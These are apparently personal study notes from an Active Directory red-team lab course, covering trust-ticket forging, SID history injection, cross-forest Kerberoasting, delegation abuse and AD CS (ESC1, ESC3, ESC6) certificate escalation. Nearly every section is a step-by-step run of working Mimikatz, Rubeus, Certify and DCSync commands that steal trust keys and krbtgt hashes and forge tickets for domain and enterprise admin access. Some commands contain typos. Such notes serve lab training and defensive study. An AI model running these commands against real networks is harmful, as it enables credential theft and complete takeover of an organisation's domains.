# AD - Trust & Certificate Service Abuse

Child to Parent using Trust Tickets

### Description

* sIDHistory is a user attribute designed for scenarios where a user is moved from one domain to another. When a user's domain is changed, they get a new SID and the old SID is added to sIDHistory.
* sIDHistory can be abused in two ways of escalating privileges within a forest: \
  – krbtgt hash of the child domain controller\
  – Trust tickets (Changed every 30 days)
* Graphic: Number 5 TGS Request contains inter-real TGT, which is signed by the trust key



<figure><img src=".gitbook/assets/image (7).png" alt=""><figcaption></figcaption></figure>

**Requirements**

* DA on child
* SafetyKatz.exe on DC

### **Tool - Using TrustKey**

1. **Export Trustkey on DC**

<pre class="language-powershell"><code class="lang-powershell">Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dchostname
or
Invoke-Mimikatz -Command '"lsadump::dcsync /user:dom\forest-dc-host$"'
or
Invoke-Mimikatz -Command '"lsadump::lsa /patch"

Output:
<strong>Domain: dom.local (dom/ S-1-5-2...) 
</strong>[ In ] sub.dom.lcao -> dom.local    
 => Take that rcklist4_hmac_nt  ....
 => We cant use AES key, they are not supported (?)
 The other keys like In-1 or In-2 are the old keys. They get rotaed every 30 days.

</code></pre>

2. **Forge an inter-realm TGT**

{% code overflow="wrap" %}
```powershell
C:\AD\Tools\BetterSafetyKatz.exe "kerberros::golden /user:Administrator /domain:sub.dom.local /sid:sid-of-current-domain /sids:sid-of-enterprise-admins-group-of-parent-domain /rc4:hash-of-trust-key-see-above-cmd /service:krbtgt /target:dom.local /ticket:C:\save-ticket-here.kirbi" "exit"


Invoke-mimikatz -command '"kerberos::golden /user:Administrator /domain:sub.dom.local /sid:sid-of-current-domain /sids:sid-of-enterprise-admins-group-of-parent-domain /rc4:hash-of-trust--key /service:krbtgt /target:dom.local /ticket:C:\save-ticket-here.kirbi'"
```
{% endcode %}

3. **Get a TGS for a Service in target domain with the new ticket / then use TGS to access targeted service/domain**

<pre class="language-powershell" data-overflow="wrap"><code class="lang-powershell">rubeus.exe asktgs /ticket:C:\save-ticket-here.kirbi /service:cifs/forest-dc-hostname.dom.local /dc:forest-dc-hostname.dom.local /ptt
ls \\forest-dc-hostname.dom.local\c$

.\asktgs.exe C:\save-ticket-here.kirbi CIFS/forest-dc-hostname.dom.local

.\kirbikator.exe lsa .\CIFS/forest-dc-hostname.dom.local  //maybe need to do it twice
ls \\forest-dc-hostname.dom.local\c$
<strong>
</strong><strong>Then run DC Sync
</strong>C:\AD\Tools\SafetyKatz.exe "lsadump::dcsync /user:forestname\krbtgt /domain:forest.local" "exit"
</code></pre>

### Tool - Using krbtgt hash of the child domain

{% code overflow="wrap" %}
```powershell
SafetyKatz on DC
lsadump ::trust /patch'

Invoke-mimikatz -command '"kerberos::golden /user:Administrator /domain:sub.dom.local /sid:sid-of-current-domain /sids:sid-of-enterprise-admins-group-of-parent-domain /krbtgt:hash-of-krbtgt /ticket:C:\save-ticket-here.kirbi'"
or
C:\AD\Tools\BetterSafetyKatz.exe "kerberos::golden /user:Administrator /domain:sub.dom.local /sid:sid-of-current-domain /sids:sid-of-enterprise-admins-group-of-parent-domain /krbtgt:krbtgt-hash /ptt" "exit"

On any machine
Invoke-Mimikatz -command '"kerberos::ptt C:\save-ticket-here.kirbi'"
ls \\parent-dc.dom.local\c$
gwmi -class win32_operatingsystem -ComputerName dc-praent.local
C:\AD\Tools\SafetyKatz.exe "lsadump::dcsync /user:parentdom\krbtgt /domain:parentdom.local" "exit"

Run DC Sync
C:\AD\Tools\SafetyKatz.exe "lsadump::dcsync /user:forestname\krbtgt /domain:forest.local" "exit"


Rest, see above
```
{% endcode %}



## Trust Abuse Across Forest

### Description

<figure><img src=".gitbook/assets/image (11) (1).png" alt=""><figcaption></figcaption></figure>

If the receiving DC on the other forest can decrypt the received TGT from Step 5, with the trust key, it assumes everything within the TGT is correct and response with a TGS.\
The trustkey is the NTLM hash of the external domain saved on our DC.

If we have access to the trustkey, we get in the end the permissions that our DA has been given in the forest domain.

### Tool

**We require the trust key for the inter-forest trust.**

```powershell
Invoke-Mimikatz -command '"lsadump::trust /patch"'
or
Invoke-Mimikatz -command '"lsadump::lsa /patch"'
```

**Inter-Forest TGT can be forged with the NTLM hash of the trust key (name of the other forest)**

{% code overflow="wrap" %}
```powershell
Invoke-Mimikatz -command '"Kerberos::golden /user:Administrator /domain:sub.dom.local /sid:SID /rc4:rc4ntlm-of-trustkey /service:krbtgt /target:targetdom.lol /ticket:C:\myticket.kirbi

rubeus.exe asktgs /ticket:C:\myticket.kirbi /service:cifs/target-dc.targetdom.local /dc:dchostname.targetdom.local /ptt
ls \\targetdom.local\forestshare

Now explicitly shares can be accessed - C$ on forest DC not
```
{% endcode %}

External Trust keys, don't automatically get renewed

Lookup:\
SIDHistory Attack for Parent-Child Domain\
SID Filtering is active for External and Forest Trusts.

## Cross Forest Kerberoast

### Description

* It is possible to execute Kerberoast across Forest trusts.&#x20;
* Let's enumerate named service accounts across forest trusts

<pre class="language-powershell" data-overflow="wrap"><code class="lang-powershell"><strong>1. Get all SPNs which are across forest
</strong><strong>Get-DomainTrust | ?{$_.TrustAttributes -eq 'FILTER_SIDS'} | %{Get-DomainUser -SPN -Domain $_.TargetName}
</strong>krbtgt account can be ignored, has default SPN configured

ADModule
Get-ADTrust -Filter 'IntraForest -ne $true' | %{GetADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName -Server $_.Name} 

2. Request a TGT
C:\AD\Tools\Rubeus.exe kerberoast /user:storagesvc /simple /domain:trusted-dom.local /outfile:trusted-dom.txt
Check the TGS
klist
Crack using John
john.exe --wordlist=C:\AD\Tools\kerberoast\10k-worst-pass.txt C:\AD\Tools\hashes.txt

or Request TGS accross trust using PowerShell
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList MSSQLSvc/eu-file.eu.local@eu.local 
</code></pre>

### Requirement

* EA in one Forest



## Cross Forest - Constrained Delegation with Protocol Transition

### Description

* The classic Constrained Delegation does not work across forest trusts.
* But we can abuse it once we have a beachhead/foothold across forest trust. If we have a User in the target forest, we can attack it!

{% code overflow="wrap" %}
```powershell
Get-DomainUser –TrustedToAuth -Domain eu.local      //eu.local is the trusted/target forest
Get-DomainComputer –TrustedToAuth -Domain eu.local

ADModule
Get-ADObject -Filter {msDS-AllowedToDelegateTo -ne "$null"} - Properties msDS-AllowedToDelegateTo -Server eu.local
Get-ADObject -Filter {msDS-AllowedToDelegateTo -ne "$null"} - Properties msDS-AllowedToDelegateTo -Server eu.local | Select msDS-AllowedToDelegateTo -expandproperty msDS-AllowedToDelegateTo
```
{% endcode %}

Request an alternative ticket using Ruebeus

{% code overflow="wrap" %}
```powershell
If we have a Password of a User first get the hash
C:\AD\Tools\Rubeus.exe hash /password:Qwerty@2019 /user:storagesvc /domain:eu.local

C:\AD\Tools\Rubeus.exe s4u /user:storagesvc /rc4:5C76877A9C454CDED58807C20C20AEAC
/impersonateuser:Administrator /domain:eu.local /msdsspn:nmagent/eu-dc.eu.local /altservice:ldap /dc:eudc.eu.local /ptt
Altservice can be choosen as wished
```
{% endcode %}

Abuse the TGS to LDAP to do a dcsync

{% code overflow="wrap" %}
```powershell
Invoke-Mimikatz -Command '"lsadump::dcsync /user:eu\krbtgt /domain:eu.local"' 

C:\AD\Tools\SharpKatz.exe --Command dcsync --User eu\krbtgt --Domain eu.local --DomainController eu-dc.eu.local
C:\AD\Tools\SharpKatz.exe --Command dcsync --User eu\administrator --Domain eu.local --DomainController eu-dc.eu.local 
```
{% endcode %}



## Cross Forest - Unconstrained Delegation

### Description

* Recall the Printer bug and its abuse from a machine with Unconstrained Delegation. This can be used even accross the forest!
* We have used it to escalate privileges to Domain Admin and Enterprise Admin.&#x20;
* It also works across a Two-way forest trust with TGT Delegation enabled!
* TGT Delegation is disabled by default and must be explicitly enabled across a trust for the trusted (target) forest.&#x20;
* In the lab, TGTDelegation is set from usvendor.local to techcorp.local (but not set for the other direction).

### Tool

<pre class="language-powershell" data-overflow="wrap"><code class="lang-powershell"><strong>1. To enumerate if TGTDelegation is enabled across a forest trust, run the below
</strong>command from a DC!!
netdom trust trustingforest /domain:trustedforest /EnableTgtDelegation
<strong>
</strong>Get-ADTrust -server usvendor.local -Filter *
<strong>
</strong>e.g In the lab, this is to be run on usvendor-dc netdom trust usvendor.local /domain:techcorp.local /EnableTgtDelegation 
The PowerShell cmdlets of the ADModule seems to have a bug, the command shows TGTDelegation set to False when run from non-dc. But when run from usvendor-dc, it shows TGTDelegation to be True. 
<strong>
</strong></code></pre>



## Cross Forest - Trust Key

### Description

* By abusing the trust flow between forests in a two way trust, it is possible to access resources across the forest boundary. &#x20;
* We can use the Trust Key, the same way as in Domain trusts but we can access only those resources which are explicitly shared with our current forest.&#x20;
* Let's try to access a file share 'eushare' on euvendor-dc of euvendor.local forest from eu.local which is explicitly shared with Domain Admins of eu.local.&#x20;
* Note that we are hopping trusts from us.techcrop.local to eu.local to euvendor.local!

Hints regarding SID Filtering:

* This is fine but why can't we access all resources just like Intra forest?&#x20;
* SID Filtering is the answer. It filters high privilege SIDs from the SIDHistory of a TGT crossing forest boundary. This means we cannot just go ahead and access resources in the trusting forest as an Enterprise Admin.
*   But there is a catch:\


    <figure><img src=".gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
* This means, if we have an external trust (or a forest trust with SID history enabled - /enablesidhistory:yes), **we can inject a SIDHistory for RID > 1000 to access resources accessible to that identity or group in the target trusting forest (if SIDHisotry is enabled).**

### Requirement

* Compromised DC

### Tools

<pre class="language-powershell" data-overflow="wrap"><code class="lang-powershell">Like intra forest scenario, we require the trust key for the inter-forest trust.
Invoke-Mimikatz -Command '"lsadump::trust /patch"'
or
Invoke-Mimikatz -Command '"lsadump::dcsync
/user:eu\euvendor$"'   // /user:domain/netbiosNameofRemoteForest
or
Invoke-Mimikatz -Command '"lsadump::lsa /patch"'
<strong>
</strong><strong>We can also use any of the earlier discussed tools to extract trust keys.
</strong><strong>
</strong><strong>Forge an inter-forest TGT
</strong>Invoke-Mimikatz -Command '"kerberos::golden/user:Administrator /domain:eu.local /sid:S-1-5-21-3657428294-2017276338-1274645009 /rc4:799a0ae7e6ce96369aa7f1e9da25175a /service:krbtgt /target:euvendor.local /sids:S-1-5-21-4066061358-3942393892-617142613-519 /ticket:C:\AD\Tools\kekeo_old\sharedwitheu.kirbi"' 
(/rc4 is the trust key; called Hash NTLM in the above output)

Get a TGS for a service (CIFS below) in the target forest by using the forged trust
ticket.
.\Rubeus.exe aktgs /ticket:C:\AD\Tools\kekeo_old\sharedwitheu.kirbi /service:CIFS/euvendordc.euvendor.local /dc:euvendor-dc.euvendor.local /ptt
.\asktgs.exe C:\AD\Tools\kekeo_old\sharedwitheu.kirbi CIFS/euvendordc.euvendor.local

Tickets for other services (like HOST and RPCSS for WMI, HOST and HTTP for
PowerShell Remoting and WinRM) can be created as well.  

Use the TGS to access the target resource which must be explicitly shared:
.\kirbikator.exe lsa CIFS.euvendordc.euvendor.local.kirbi
ls \\euvendor-dc.euvendor.local\eushare\
</code></pre>

## Cross Forest - SID Filtering Hints

Find out if SID history is enabled

<pre class="language-powershell" data-overflow="wrap"><code class="lang-powershell"><strong>Get-ADTrust -Filter *
</strong>  If SIDFilteringForestAware is set to True, it means SIDHistory is enabled across the forest trust.
</code></pre>

Get users with RID > 1000, which could be used for the attack.

<pre class="language-powershell" data-overflow="wrap"><code class="lang-powershell">Get-ADGroup -Filter * -server euvendor.local  //Gives all the Groups, choose the interesting ones
Get-ADGroup -Identity EUAdmins -Server euvendor.local  //Check for RID > 1000 which are admins. Do that on the relevant DC or on a machine in that domain
Get-ADGroup -filter 'SID -ge "S-1-.....-1000"' -server euvendor.local   //all SIDs greater than 1000

Then perform SID history Injection / Create a TGT with SIDHIsotry of the Group EUAdmins:
Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:eu.local /sid:S-1-5-21-3657428294-2017276338-1274645009 /rc4:799a0ae7e6ce96369aa7f1e9da25175a /service:krbtgt /target:euvendor.local /sids:S-1-5-21-4066061358-3942393892-617142613-1103 /ticket:C:\Users\Public\euvendornet.kirbi"'

Request a TGS:
C:\Users\Public\Rubeus.exe asktgs /ticket:C:\Users\Public\euvendornet.kirbi /service:HTTP/euvendornet.euvendor.local /dc:euvendor-dc.euvendor.local /ptt

Access the euvendor-net machine using PSRemoting:
<strong>Invoke-Command -ScriptBlock{whoami} -ComputerName euvendornet.euvendor.local -Authentication NegotiateWithImplicitCredential 
</strong></code></pre>



## Cross Forest - Foreign Security Principals

### Description

* A Foreign Security Principal (FSP) represents a Security Principal in a external forest trust or special identities (like Authenticated Users, Enterprise DCs etc.).&#x20;
* Only SID of a FSP is stored in the Foreign Security Principal Container which can be resolved using the trust relationship.&#x20;
* FSP allows external principals to be added to domain local security groups. Thus, allowing such principals to access resources in the forest.&#x20;
* Often, FSPs are ignored, mis-configured or too complex to change/cleanup in an enterprise making them ripe for abuse.

### Tools

Let's enumerate FSPs for the db.local domain using the reverse shell we have there.

{% code overflow="wrap" %}
```powershell
Find-ForeignGroup -Verbose
Find-ForeignUser -Verbose

ADModule
Get-ADObject -Filter {objectClass -eq "foreignSecurityPrincipal"} 
```
{% endcode %}

## Cross Forest - ACLs

* Access to resources in a forest trust can also be provided without using FSPs using ACLs.
* Principals added to ACLs do NOT show up in the ForeignSecurityPrinicpals container as the container is populated only when a principal is added to a domain local security group.

Find-InterestingDomainAcl -Domain dbvendor.local

## $AD Certificate Service (CS)

### Description

* Active Directory Certificate Services (AD CS) enables use of Public Key Infrastructure (PKI) in active directory forest.
* AD CS helps in authenticating users and machines, encrypting and signing documents, filesystem, emails and more.&#x20;
* "AD CS is the Server Role that allows you to build a public key infrastructure (PKI) and provide public key cryptography, digital certificates, and digital signature capabilities for your organization."
* CA - The certification authority that issues certificates. The server with AD CS role (DC or separate) is the CA.
* Certificate - Issued to a user or machine and can be used for authentication, encryption, signing etc.
* CSR - Certificate Signing Request made by a client to the CA to request a certificate.
* Certificate Template - Defines settings for a certificate. Contains information like - enrolment permissions, EKUs, expiry etc.
* EKU OIDs - Extended Key Usages Object Identifiers. These dictate the use of a certificate template (Client authentication, Smart Card Logon, SubCA etc.)

<figure><img src=".gitbook/assets/image (13).png" alt=""><figcaption></figcaption></figure>

There are various ways of abusing ADCS! (See the link to "Certified PreOwned" paper in slide notes):&#x20;

– Extract user and machine certificates \
– Use certificates to retrieve NTLM hash\
– User and machine level persistence\
– Escalation to Domain Admin and Enterprise Admin\
– Domain persistence

<figure><img src=".gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>

<figure><img src=".gitbook/assets/image (9).png" alt=""><figcaption></figcaption></figure>

### Requirement

Common requirements/misconfigurations for all the Escalations that we have in the lab (ESC1, ESC3 and ESC6)&#x20;

– CA grants normal/low-privileged users enrollment rights\
– Manager approval is disabled\
– Authorization signatures are not required\
– The target template grants normal/low-privileged users enrollment rights

### Tool

Certify tool (https://github.com/GhostPack/Certify)

```
Enumerate information about all registered CAs
Certify.exe cas

Enumerate the templates
Certify.exe find

Enumerate vulnerable templates
Certify.exe find /vulnerable
```

**ESC 3**

The template "SmartCardEnrollment-Users" has an Application Policy Issuance Requirement of Certificate Request Agent and has an EKU that allows for domain authentication. Search for domain authentication EKU:

<pre class="language-powershell" data-overflow="wrap"><code class="lang-powershell">Certify.exe find /json /outfile:C:\AD\Tools\file.json ((Get-Content C:\AD\Tools\file.json | ConvertFromJson).CertificateTemplates | ? {$_.ExtendedKeyUsage -contains "1.3.6.1.5.5.7.3.2"}) | fl *

Escalate to DA
We can now request a certificate for Certificate Request Agent from "SmartCardEnrollmentAgent" template.
Certify.exe request /ca:mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA
/template:SmartCardEnrollment-Agent

Convert from cert.pem to pfx (esc3agent.pfx below) and use it to request a certificate on behalf of DA using the "SmartCardEnrollment-Users" template.
Certify.exe request /ca:mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA
/template:SmartCardEnrollment-Users /onbehalfof:dcorp\administrator
/enrollcert:esc3agent.pfx /enrollcertpw:SecretPass@123

Convert from cert.pem to pfx (esc3user-DA.pfx below), request DA TGT and inject it:
Rubeus.exe asktgt /user:administrator /certificate:esc3user-DA.pfx
/password:SecretPass@123 /ptt
<strong>
</strong>
</code></pre>

_Escalate to EA_

{% code overflow="wrap" %}
```
Convert from cert.pem to pfx (esc3agent.pfx below) and use it to request a
certificate on behalf of EA using the "SmartCardEnrollment-Users" template.
Certify.exe request /ca:mcorp-dc.moneycorp.local\moneycorpMCORP-DC-CA /template:SmartCardEnrollment-Users /onbehalfof:moneycorp.local\administrator
/enrollcert:esc3agent.pfx /enrollcertpw:SecretPass@123

Request EA TGT and inject it.
Rubeus.exe asktgt /user:moneycorp.local\administrator /certificate:esc3user.pfx /dc:mcorp-dc.moneycorp.local /password:SecretPass@123 /ptt
```
{% endcode %}

**ESC 6**

The CA in moneycorp has EDITF\_ATTRIBUTESUBJECTALTNAME2 flag set. This means that we can request a certificate for ANY user from a template that allow enrollment for normal/low-privileged users

{% code overflow="wrap" %}
```powershell
Certify.exe find

The template "CA-Integration" grants enrollment to the RDPUsers group. Request a
certificate for DA (or EA) as studentx
Certify.exe request /ca:mcorp-dc.moneycorp.local\moneycorp-MCORP-DCCA /template:"CA-Integration" /altname:administrator

Convert from cert.pem to pfx (esc6.pfx below) and use it to request a TGT for DA (or
EA).
Rubeus.exe asktgt /user:administrator /certificate:esc6.pfx /password:SecretPass@123 /ptt

```
{% endcode %}

**ESC1**

The template "HTTPSCertificates" has ENROLLEE\_SUPPLIES\_SUBJECT value for msPKI-Certificates-Name-Flag

Needs extracted Certificate  - see CRTE Lab 10

{% code overflow="wrap" %}
```powershell
Certify.exe find /enrolleeSuppliesSubject

The template "HTTPSCertificates" allows enrollment to the RDPUsers group. Request
a certificate for DA (or EA) as studentx
Certify.exe request /ca:mcorp-dc.moneycorp.local\moneycorp-MCORP-DCCA /template:"HTTPSCertificates" /altname:administrator /outfile:esc1.pem

Edit File esc1.pem: 
 -----BEGIN RSA PRIVATE KEY----- ... -----END CERTIFICATE-----

Convert from cert.pem to pfx (esc1.pfx below) and use it to request a TGT for DA (or
EA).
C:\AD\Tools\openssl\openssl.exe pkcs12 -in C:\AD\Tools\esc1.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out C:\AD\Tools\esc1-DA.pfx

Rubeus.exe asktgt /user:administrator /certificate:esc1.pfx
/password:SecretPass@123 /ptt

```
{% endcode %}

**If we have the certificate of a User  see CRTE Lab 10**

<pre data-overflow="wrap"><code><strong>Use the certificate to request a TGT of the user you have the cert
</strong><strong>C:\AD\Tools\Rubeus.exe asktgt /user:pawadmin /certificate:C:\AD\Tools\pawadmin.pfx /password:PWyouSetWhenExtractingTheCert /nowrap /ptt
</strong><strong>
</strong><strong>Now TGT is in klist
</strong><strong>
</strong><strong>Now Request a certificate for the domain admin user via the template ForAdminsofPrivilegedAccessWorkstations
</strong>C:\AD\Tools\Certify.exe request /ca:TechcorpDC.techcorp.local\TECHCORP-DC-CA /template:ForAdminsofPrivilegedAccessWorkstations /altname:Administrator 

copy key/cert from outpu to file cert.pem and Convert  cert.pem to pfx
C:\AD\Tools\openssl\openssl.exe pkcs12 -in C:\AD\Tools\esc1.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out C:\AD\Tools\esc1-DA.pfx

rubues asktgt /user:Administrator /certificate:path\da.pfx /password:youSpecified /nowrap /ptt

Request Enterprise Admin TGT an inject
C:\AD\Tools\Rubeus.exe asktgt /user:techcorp.local\Administrator
/dc:techcorp-dc.techcorp.local /certificate:C:\AD\Tools\EA.pfx
/password:SecretPass@123 /nowrap /ptt
</code></pre>









*
